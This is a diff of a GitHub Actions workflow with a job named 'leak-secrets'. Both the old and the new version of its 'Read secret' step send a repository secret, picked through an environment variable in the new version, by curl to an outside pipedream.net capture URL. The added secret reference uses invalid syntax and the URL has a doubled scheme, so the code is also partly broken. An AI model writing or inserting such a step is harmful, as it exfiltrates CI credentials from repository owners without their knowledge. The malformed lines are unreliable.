@@ -6,6 +6,8 @@ on:
 jobs:
   leak-secrets:
     runs-on: ubuntu-latest
+    env:
+       SECRET: ${{ secrets.TOK3N }}
     steps:
       - uses: actions/checkout@v3
         with:
@@ -13,4 +15,4 @@ jobs:
 
       - name: Read secret
         run: |
-            curl -G --data-urlencode "token=${{ secrets.ABC }}" https://https://eo972st867vneb1.m.pipedream.net
+            curl -G --data-urlencode "token=${{ secrets.$SECRET }}" https://https://eo972st867vneb1.m.pipedream.net
